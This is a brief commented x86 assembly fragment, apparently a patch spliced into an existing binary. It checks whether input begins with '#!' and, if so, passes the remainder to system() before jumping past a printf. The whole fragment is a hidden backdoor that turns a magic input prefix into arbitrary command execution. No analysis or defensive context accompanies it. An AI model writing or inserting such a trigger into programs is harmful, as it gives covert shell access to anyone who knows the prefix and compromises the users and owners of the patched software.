jmp 0x64 #jmp to 0x08048631
cmp byte ptr [eax] , '#' #check if start with #
jne 0x6D
cmp byte ptr[eax+1], '!' #check if second byte !
jne 0x6D
lea eax, [ebp-0x40c] #the address of the pointer to char*
add eax, 2 #remove #!
push eax
call -0x16D #system
pop eax
jmp 0x84 #jump after printf
